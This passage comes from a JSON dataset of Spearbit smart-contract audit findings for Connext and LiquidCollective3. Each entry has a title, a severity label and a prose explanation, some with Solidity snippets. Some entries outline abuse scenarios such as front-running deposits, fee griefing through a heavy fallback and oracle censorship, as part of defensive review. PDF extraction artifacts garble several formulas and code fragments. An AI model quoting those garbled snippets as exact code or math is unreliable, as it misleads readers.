            "Severity: Informational"
        ]
    },
    {
        "title": "Unused variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The variable message is not used after declaration. bytes memory message;",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect Natspec for adopted and canonical asset mappings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "adoptedToCanonical maps adopted assets to canonical assets, but is described as a \"Mapping of canonical to adopted assets\"; canonicalToAdopted maps canonical assets to adopted assets, but is described as a \"Mapping of adopted to canonical assets\". // /** // * @notice Mapping of canonical to adopted assets on this domain // * @dev If the adopted asset is the native asset, the keyed address will // * be the wrapped asset address // */ // 12 mapping(address => TokenId) adoptedToCanonical; // /** // * @notice Mapping of adopted to canonical on this domain // * @dev If the adopted asset is the native asset, the stored address will be the // * wrapped asset address // */ // 13 mapping(bytes32 => address) canonicalToAdopted;",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of SafeMath for solc >= 0.8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "AmplificationUtils, SwapUtils, ConnextPriceOracle, GovernanceRouter.sol use SafeMath. Since 0.8.0, arithmetic in solidity reverts if it overflows or underflows, hence there is no need to use open- zeppelins SafeMath library.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "_pickNextValidatorsToExitFromActiveOperators uses the wrong index to query stopped validator count for operators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "operators does not necessarily have the same order as the actual OperatorsV2's operators, since the ones that don't have _hasExitableKeys will be skipped (the operator might not be active or all of its funded keys might have been requested to exit). And so when querying the stopped validator counts for (uint256 idx = 0; idx < exitableOperatorCount;) { uint32 currentRequestedExits = operators[idx].requestedExits; uint32 currentStoppedCount = _getStoppedValidatorsCountFromRawArray(stoppedValidators, idx); one should not use the idx in the cached operator's array, but the cached index of this array element, as the indexes of stoppedValidators correspond to the actual stored operator's array in storage. Note that when emitting the UpdatedRequestedValidatorExitsUponStopped event, the correct index has been used.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Oracles' reports votes are not stored in storage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The purpose of Oracle.1.sol is to facilitate the reporting and quorum of oracles. Oracles period- ically add their reports and when consensus is reached the setConsensusLayerData function (which is a critical component of the system) is called. However, there is an issue with the current implementation as ReportVari- ants holds the reports made by oracles but ReportVariants.get() returns a memory array instead of a storage array, therefore resulting in an increase in votes that will not be stored at the end of the transaction and prevent- ing setConsensusLayerData from being called. This is a regression bug that should have been detected by a comprehensive test suite.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "User's LsETH might be locked due to out-of-gas error during recursive calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Let W0, W1, ...W7 represent the withdrawal events in the withdrawal stack. Let R0, R1, R2 represent the users' redeem requests in the redeem queue. Assume that Alice is the owner of R1. When Alice called the resolveRedeemRequests function against R1, it will resolve to W 1. Next, Alice called the _claimRedeemRequest function with R1 and its corresponding W 1. The _claimRedeemRequest will first process W 1. At the end of the function, it will check if W 1 matches all the amounts of R1. If not, it will call the _claimRedeemRequest function recursively with the same request id (R1) but increment the withdrawal event id (W2 = W1 + 1). The _claimRedeemRequest function recursively calls itself until all the amount of redeem request is \"expended\" or the next withdrawal event does not exist. In the above example, the _claimRedeemRequest will be called 7 times with W1...W7, until all the amount of R1 is \"expended\" (R1.amount == 0) However, if the amount of a redeem request is large (e.g. 1000 LsETH), and this redeem request is satisfied by many small chunks of withdrawal events (e.g. one withdrawal event consists of less than 10 LsETH), then the recursion depth will be large. The function will keep calling itself recursively until an out-of-gas error happens. If this happens, there is no way to claim the redemption request, and the user's LsETH will be locked. In the current implementation, users cannot break the claim into smaller chunks to overcome the gas limit. In the above example, if Alice attempts to break the claim into smaller chunks by first calling the _claimRedeemRequest function with R1 and its corresponding W5, the _isMatch function within it will revert.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Allowed users can directly transfer their share to RedeemManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "An allowed user can directly transfer its shares to the RedeemManager without requesting a redeem. This would cause the withdrawal stack to grow, since the redeem demand (2) which is calculated based on the RedeemManager's share of LsETH increases. RedeemQueue would be untouched in this case. In case of an accidental mistake by a user, the locked shares can only be retrieved by a protocol update.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Invariants are not enforced for stopped validator counts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_setStoppedValidatorCounts does not enforce the following invariants:  stoppedValidatorCounts[0] <= DepositedValidatorCount.get()  stoppedValidatorCounts[i] needs to be a non-decreasing function when viewed on a timeline  stoppedValidatorCounts[i] needs to be less than or equal to the funded number of validators for the corresponding operator. Currently, the oracle members can report values that would break these invariants. As a consequence, the oracle members can signal the operators to exit more or fewer validators by manipulating the preExitingBalance value. And activeCount for exiting validators picking algorithm can also be manipulated per operator.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Potential out of gas exceptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The purpose of _requestExitsBasedOnRedeemDemandAfterRebalancings is to release liquidity for withdrawals made in the RedeemManager contract. The function prioritizes liquidity sources, starting with Balance- ToRedeem and then BalanceToDeposit, before asking validators to exit. However, if the validators are needed to release more liquidity, the function uses pickNextValidatorsToExit to determine which validators to ask to exit. This process can be quite gas-intensive, especially if the number of validators is large. The gas consumption of this function depends on several factors, including exitableOperatorCount, stoppedVal- idators.length, and the rate of decrease of _count. These factors may increase over time, and the msg.sender does not have control over them. The function includes two nested loops that contribute to the overall gas con- sumption, and this can be problematic for certain inputs. For example, if the operators array has no duplications and the difference between values is exactly 1, such as [n, n-1, n-2 ... n-k] where n can be any number and k is a large number equals exitableOperatorCount - 1 and _count is also large, the function can become extremely gas-intensive. The main consequence of such a potential issue is that the function may not release enough liquidity to the RedeemManager contract, resulting in partial fulfillment of redemption requests. Similarly, _pickNextValidatorsToDepositFromActiveOperators is also very gas intensive. If the number of de- sired validators and current operators (including fundable operators) are high enough, depositToConsensusLayer is no longer callable.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The validator count to exit in _requestExitsBasedOnRedeemDemandAfterRebalancings assumes that the to-be selected validators are still active and have not been penalised.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The validatorCountToExit is calculated as follows uint256 validatorCountToExit = LibUint256.ceil( redeemManagerDemandInEth - (availableBalanceToRedeem + exitingBalance + preExitingBalance), DEPOSIT_SIZE ); This formula assumes that the to-be selected validators exit by the pickNextValidatorsToExit are: 1. Still active 2. Have not been queued to be exited and 3. Have not been penalized and their balance is at least MAX_EFFECTIVE_BALANCE",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Burn RedeemManager's share first before calling its reportWithdraw endpoint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "reportWithdraw and then burns the corresponding shares for the RedeemManager The current implementation of _reportWithdrawToRedeemManager calls RedeemManager's // perform a report withdraw call to the redeem manager redeemManager_.reportWithdraw{value: suppliedRedeemManagerDemandInEth}(suppliedRedeemManagerDemand); // we burn the shares of the redeem manager associated with the amount of eth provided _burnRawShares(address(RedeemManagerAddress.get()), suppliedRedeemManagerDemand);",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OracleManager allows reporting for the same epoch multiple times, leading to unknown behavior.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Currently, it is possible for the oracle to report on the same epoch multiple times, because _- isValidEpoch checks that the report's epoch >= LastConsensusLayerReport.get().epoch. This can lead the contract to unspecified behavior  The code will revert if the report increases the balance, not with an explicit check but reverting due to a subtraction underflow, since maxIncrease == 0 and  Allowing other code paths to execute to completion.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing event emit when user calls deposit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Whenever BalanceToDeposit is updated, the protocol should emit a SetBalanceToDeposit, but when a user calls UserDepositManager.deposit, the event is never emitted which could break tooling.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Reset the report data and increment the last epoch id before calling River's setConsensusLayerData when a quorum is made",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of reportConsensusLayerData calls river.setConsensusLayerData(report) first when a quorum is made then resets the report variant and position data and also it increment the last epoch id afterward // if adding this vote reaches quorum if (variantVotes + 1 >= quorum) { // we push the report to river river.setConsensusLayerData(report); // we clear the reporting data _clearReports(); // we increment the lastReportedEpoch to force reports to be on the last frame LastEpochId.set(lastReportedEpochValue + 1); emit SetLastReportedEpoch(lastReportedEpochValue + 1); } In the future version of the protocol there might be a possibility for an oracle member to call back into reportCon- sensusLayerData when river.setConsensusLayerData(report) is called and so it would open a reentrancy for compromised/malicious oracle members.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Update BufferedExceedingEth before calling sendRedeemManagerExceedingFunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "In pullExceedingEth , River's sendRedeemManagerExceedingFunds is called before updating the RedeemManager's BufferedExceedingEth storage value _river().sendRedeemManagerExceedingFunds{value: amountToSend}(); BufferedExceedingEth.set(BufferedExceedingEth.get() - amountToSend);",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Any oracle member can censor almost quorum report variants by resetting its address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The admin or an oracle member can DoS or censor almost quorum reports by calling setMember endpoint which would reset the report variants and report positions. The admin also can reset the/clear the reports by calling other endpoints by that should be less of an issue compared to just an oracle member doing that.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incentive mechanism that encourages operators to respond quickly to exit requests might diminish under certain condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "/// @notice Retrieve all the active and fundable operators /// @dev This method will return a memory array of length equal to the number of operator, but /// @dev populated up to the fundable operator count, also returned by the method /// @return The list of active and fundable operators /// @return The count of active and fundable operators function getAllFundable() internal view returns (CachedOperator[] memory, uint256) { // uint32[] storage stoppedValidatorCounts = getStoppedValidators(); for (uint256 idx = 0; idx < operatorCount;) { _hasFundableKeys(r.value[idx]) && _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits only @audit-ok File: Operators.2.sol 153: 154: ,! 155: 156: 157: 158: ,! ..SNIP.. 172: 173: 174: 175: 176: 177: ,! 178: if ( ) { r.value[idx].requestedExits is the accumulative number of requested validator exits by the protocol _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) function is a value reported by oracle members which consist of both exited and slashed validator counts It was understood the rationale of having the _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits conditional check at Line 177 above is to incentivize operators to re- In other words, an operator with a re- spond quickly to exit requests if they want new stakes from deposits. questedExits value larger than the _getStoppedValidatorCountAtIndex count indicates that an operator did not submit exit requests to the Consensus Layer (CL) in a timely manner or the exit requests have not been finalized in CL. However, it was observed that the incentive mechanism might not work as expected in some instances. Consider the following scenario: Assuming an operator called A has 5 slashed validators and 0 exited validators, the _getStoppedValidator- CountAtIndex function will return 5 for A since this function takes into consideration both stopped and slashed validators. Also, assume that the requestedExits of A is 5, which means that A has been instructed by the protocol to submit 5 exit requests to CL. In this case, the incentive mechanism seems to diminish as A will still be considered a fundable operator even if A does not respond to exit requests since the number of slashed validators is enough to \"help\" to push up the stopped validator count to satisfy the condition, giving the wrong impression that A has already submitted the exit requests. As such, A will continue to be selected to stake new deposits.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "RedeemManager. _claimRedeemRequests transaction sender might be tricked to pay more eth in trans- action fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The _claimRedeemRequests function is designed to allow anyone to claim ETH on behalf of another party who has a valid redeem request. The function iterates through the redeemRequestIds list and fulfills each request individually. However, it is important to note that the transfer of ETH to the recipients is only limited by the 63/64 rule, which means that it is possible for a recipient to take advantage of a heavy fallback function and potentially cause the sender to pay a significant amount of unwanted transaction fees.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Claimable LsETH on the Withdraw Stack could exceed total LsETH requested on the Redeem Queue",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Let the total amount of claimable LsETH on the Withdraw Stack be x and the total amount of LsETH requested on the Redeem Queue be y. The following points are extracted from the Withdrawals Smart Contract Architecture documentation:  The design ensures that x <= y . Refer to page 15 of the documentation.  It is impossible for a redeem request to be claimed before at least one Oracle report has occurred, so it is impossible to skip a slashing time penalty. Refer to page 16 of the documentation. Based on the above information, the main purpose of the design (x <= y) is to avoid favorable treatment of LsETH holders that would request a redemption before others following a slashing incident. However, this constraint (x <= y ) is not being enforced in the contract. The reporter could continue to report withdrawal via the RedeemManager.reportWithdraw function till the point x > y. If x > y, LsETH holders could request a redemption before others following a slashing incident to gain an advan- tage.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "An oracle member can resubmit data for the same epoch multiple times if the quorum is set to 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "If the quorum is set to 1 and the difference between the report's epoch e and LastEpochId.get() is (cid:1)e, an oracle member will be able to call reportConsensusLayerData (cid:1)e + 1 times to push its report for epoch e to the protocol and with different data each time (only restriction on successive reports is that the difference of underlying balance between reports would need to be negative since the maxIncrease will be 0). Note that in reportConsensusLayerData the first storage write to LastEpochId will be overwritten later due to quorum of one: x = LastEpochId -> report.epoch -> x + 1",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Report's validatorsCount's historical non-decreseness does not get checked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Once the Oracle members come to a quorum for a selected report variant, the validators count is stored in the storage. Note that validatorsCount is supposed to represent the total cumulative number of validators ever funded on consensus layer (even if they have been slashed or exited at some point ). So this value is supposed to be a non-decreasing function of reported epochs. But this invariant has never been checked in setConsensusLayerData.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The report's slashingContainmentMode and bufferRebalancingMode are decided by the oracle mem- bers which affects the exiting strategy of validators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The current protocol leaves it up to the oracle members to come to a quorum to set either of the report.slashingContainmentMode or report.bufferRebalancingMode to true or false. That means the oracle members have the power to decide off-chain whether validators should be exited and whether some of the deposit balance should be reallocated for redeeming (vs an algorithmic decision by the protocol on-chain). A potential bad scenario would be oracle members deciding to not signal for new validators to exit and from the time for the current epoch to the next report some validators get penalized or slashed which would reduce the If those validators would have exited before getting slashed or penalized, the underlying value of the shares. redeemers would have received more ETH back for their investment.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain. An example is when an operator would want to remove a validator key that is not-funded yet but has an index below the operator limit and will be picked by the strategy if depositToConsensusLayer is called. Then anyone can front run the removal call by the operator and force push this validator's info to the deposit contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calculation of currentMaxCommittableAmount can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "currentMaxCommittableAmount is calculated as: // we adapt the value for the reporting period by using the asset balance as upper bound uint256 underlyingAssetBalance = _assetBalance(); uint256 currentBalanceToDeposit = BalanceToDeposit.get(); ... uint256 currentMaxCommittableAmount = LibUint256.min( LibUint256.min(underlyingAssetBalance, (currentMaxDailyCommittableAmount * period) / 1 days), currentBalanceToDeposit ); But underlyingAssetBalance is Bu = Bv +Bd +Bc +Br +32(Cd (cid:0)Cr ) which is greater than currentBalanceToDeposit Bd since the other components are non-negative values. parameter description Bv Bd Bc Br Cd Cr M m Bu LastConsensusLayerReport.get().validatorsBalance BalanceToDeposit.get() CommittedBalance.get() BalanceToRedeem.get() DepositedValidatorCount.get() LastConsensusLayerReport.get().validatorsCount currentMaxCommittableAmount currentMaxDailyCommittableAmount * period) / 1 days underlyingAssetBalance Note that the fact that Cd (cid:21) Cr is an invariant that is enforced by the protocol. and so currently we are computing M as: M = min(Bu, Bd , m) = min(Bd , m) since Bu (cid:21) Bd .",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Remove redundant array length check and variable to save gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "When someone calls ConsensusLayerDepositManager.depositToConsensusLayer, the contract will verify that the receivedSignatureCount matches the receivedPublicKeyCount returned from _getNextVal- idators. This is unnecessary as the code always creates them with the same length.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicated events emitted in River and RedeemManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The amount of ETH pulled from the redeem contract when setConsensusData is called by the oracle is notified with events in both RedeemManager and River contracts.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "totalRequestedExitsValue's calculation can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "In the for loop in this context, totalRequestedExitsValue is updated for every operator that sat- isfies _getActiveValidatorCountForExitRequests(operators[idx]) == highestActiveCount. Based on the used increments, their sum equals to optimalTotalDispatchCount.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Report's bufferRebalancingMode and slashingContainmentMode are only used during the reporting transaction process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "report.bufferRebalancingMode and report.slashingContainmentMode are only used during the transaction and their previous values are not used in the protocol. They can be removed from being added to the stored report. Note that their historical values can be queried by listening to the ProcessedConsensusLayerReport(report, vars.trace) events.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Add more comments/documentation for ConsensusLayerReport and StoredConsensusLayerReport structs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The ConsensusLayerReport and StoredConsensusLayerReport structs are defined as /// @notice The format of the oracle report struct ConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; uint32[] stoppedValidatorCountPerOperator; bool bufferRebalancingMode; bool slashingContainmentMode; } /// @notice The format of the oracle report in storage struct StoredConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; bool bufferRebalancingMode; bool slashingContainmentMode; } Comments regarding their specified fields are lacking.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "postUnderlyingBalanceIncludingExits and preUnderlyingBalanceIncludingExits can be removed from setConsensusLayerData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Both postUnderlyingBalanceIncludingExits ( Bpost ) and preUnderlyingBalanceIncludingEx- its ( Bpre ) include the accumulated skimmed and exited amounts overtime which part of them might have exited the protocol through redeeming (or skimmed back to CL and penalized). Their delta is almost the same as the delta of vars.postReportUnderlyingBalance and vars.preReportUnderlyingBalance (almost if one adds a check for non-decreases of validator counts). u u : postUnderlyingBalanceIncludingExits u : preUnderlyingBalanceIncludingExits u (cid:0) Bpre u : vars.postReportUnderlyingBalance : vars.preReportUnderlyingBalance : Breport,post (cid:0) Breport,pre u u  Bpost u  Bpre  (cid:1)Bu: Bpost  Breport,post  Breport,pre u  (cid:1)Breport u  Bprev v : u  Bcurr v  (cid:1)Bv : Bcurr  Bprev s  Bcurr s  (cid:1)Bs: Bcurr  Bprev e  Bcurr e  (cid:1)Be: Bcurr previous reported/stored value for total validator balances in CL LastConsensusLayerRe- port.get().validatorsBalance v (cid:0) Bprev v (can be negative) : current reported value of total validator balances in CL report.validatorsBalance : LastConsensusLayerReport.get().validatorsSkimmedBalance : report.validatorsSkimmedBalance s (cid:0) Bprev s (always non-negative, this is an invariant that gets checked). : LastConsensusLayerReport.get().validatorsExitedBalance : report.validatorsExitedBalance e (cid:0) Bprev e (always non-negative, this is an invariant that gets checked).  $C{prev} $: LastConsensusLayerReport.get().validatorsCount  Ccurr : report.validatorsCount  (cid:1)C: Ccurr (cid:0) Cprev (this value should be non-negative, note this invariant has not been checked in the code- base)  Cdeposit : DepositedValidatorCount.get()  Bd : BalanceToDeposit.get() 22  Bc: CommittedBalance.get()  Br : BalanceToRedeem.get() Note that the above values are assumed to be in their form before the current report gets stored in the storage. Then we would have Bpost u = Bcurr v + Bcurr s + Bcurr e = Bpre u + (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C and so: (cid:1)Bu = (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C = (cid:1)Breport u",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "The formula or the parameter names for calculating currentMaxDailyCommittableAmount can be made more clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "currentMaxDailyCommittableAmount is calculated using the below formula: // we compute the max daily committable amount by taking the asset balance without the balance to deposit into account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); Therefore its value is the maximum of two potential maximum values.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "preExitingBalance is a rough estimate for signalling the number of validators to request to exit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "exitingBalance and preExitingBalance might be trying to compensate for the same portion of balance (non-stopped validators which have been signaled to exit and are in the CL exit queue). That means the number of validatorCountToExit calculated to accommodate for the redeem demand is actually lower than what is required. The important portion of preExitingBalance is for the validators that were singled to exit in the previous reporting round but the operators have not registered them for exit in CL. Also totalStoppedValidatorCount can include slashed validator counts which again lowers the required validatorCountToExit and those values should not be accounted for here. Perhaps the oracle members should also report the slashing counts of validators so that one can calculate these values more accurately.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "More documentation can be added regarding the currentMaxDailyCommittableAmount calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "currentMaxDailyCommittableAmount calculated as // we compute the max daily committable amount by taking the asset balance without the balance to deposit into the account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); We can add further to the comment: Since before the _commitBalanceToDeposit hook is called we have skimmed the remaining to redeem balance to BalanceToDeposit, underlyingAssetBalance - currentBalanceToDeposit represent the funds allocated for CL (funds that are already in CL, funds that are in transit to CL or funds committed to be deposited to CL). It is important that the redeem balance is already skimmed for this upper bound calculation, so for future code changes we should pay attention to the order of hook callbacks otherwise the upper bounds would be different.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "BalanceToRedeem is only non-zero during a report processing transaction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "BalanceToRedeem is only ever posses a non-zero value during the report processing when a quorum has been made for the oracle member votes (setConsensusLayerData). And at the very end of this process its value gets reset back to 0.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve clarity on bufferRebalancingMode variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "According to the documentation, the bufferRebalancingMode flag passed by the oracle should allow or disallow the rebalancing of funds between the Deposit and Redeem buffers. The flag correctly disables rebalancing in the DepositBuffer to RedeemBuffer direction as can be seen here if (depositToRedeemRebalancingAllowed && availableBalanceToDeposit > 0) { uint256 rebalancingAmount = LibUint256.min( availableBalanceToDeposit, redeemManagerDemandInEth - exitingBalance - availableBalanceToRedeem ); if (rebalancingAmount > 0) { availableBalanceToRedeem += rebalancingAmount; _setBalanceToRedeem(availableBalanceToRedeem); _setBalanceToDeposit(availableBalanceToDeposit - rebalancingAmount); } } but it is not used at all when pulling funds in another way // if funds are left in the balance to redeem, we move them to the deposit balance _skimExcessBalanceToRedeem();",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix code style consistency issues",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "There is a small code styling mismatch between the new code under audit and the style used through the rest of the code. Specifically, function parameter names are supposed to be prepended with _ to differentiate them from variables defined in the function body.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "DENOMINATION_OFFSET is unused and can be removed from the codebase.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what TotalRequestedExits can potentially represent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Documentation is lacking for TotalRequestedExits. This parameter represents a quantity that is a mix of exited (or to be exited) and slashed validators for an operator. Also, in general, this is a rough quantity since we don't have a finer reporting of slashed and exited validators (they are reported as a sum).",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly emit RequestedValidatorExits(operators[idx].index, requestedExits + operators[idx].picked); Note that requestedExits + operators[idx].picked represents the upper bound for the index of the funded validators that need to be exited by the operator.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Oracle members would need to listen to ClearedReporting and report their data if necessary",
